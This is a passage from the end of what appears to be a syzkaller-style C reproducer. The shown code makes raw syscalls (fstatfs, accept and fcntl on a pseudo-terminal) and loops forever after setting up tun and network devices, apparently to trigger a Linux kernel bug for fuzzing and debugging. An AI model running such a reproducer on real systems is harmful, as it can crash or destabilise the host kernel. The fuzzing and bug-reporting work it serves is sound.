	syscall(__NR_fstatfs, r[1], 0x200000c0);
	syz_open_pts(r[2], 0);
	*(uint32_t*)0x20000340 = 0x10;
	syscall(__NR_accept, r[2], 0x20000300, 0x20000340);
	syscall(__NR_fcntl, r[2], 4, 0x40400);
}

int main()
{
	syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
	char *cwd = get_current_dir_name();
	for (;;) {
		if (chdir(cwd))
			fail("failed to chdir");
		use_temporary_dir();
		initialize_tun();
		initialize_netdevices();
		loop();
	}
}
```

**End**